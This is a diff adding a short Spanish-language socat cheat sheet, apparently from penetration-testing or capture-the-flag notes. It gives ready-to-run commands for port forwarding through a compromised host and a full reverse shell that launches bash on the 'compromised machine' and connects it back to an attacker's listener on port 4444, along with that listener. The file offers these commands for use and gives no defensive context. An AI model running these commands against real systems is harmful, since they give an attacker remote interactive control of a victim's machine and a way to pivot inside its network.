@@ -1,0 +1,11 @@
+▶ Escucha para Port Forwarding (Ejecutar en máquina local):
+  ./socat TCP-LISTEN:4444,fork,reuseaddr TCP-LISTEN:<port_to_forward>
+
+▶ Conexión para Port Forwarding (Ejecutar en máquina remota):
+  ./socat TCP:$IP:4444 TCP:127.0.0.1:<port_to_forward>
+
+▶ Reverse Shell desde Víctima Remota (Ejecutar en máquina comprometida):
+  ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$IP:4444
+
+▶ Escucha para Reverse Shell (Ejecutar en máquina local):
+  ./socat file:`tty`,raw,echo=0 tcp-listen:4444
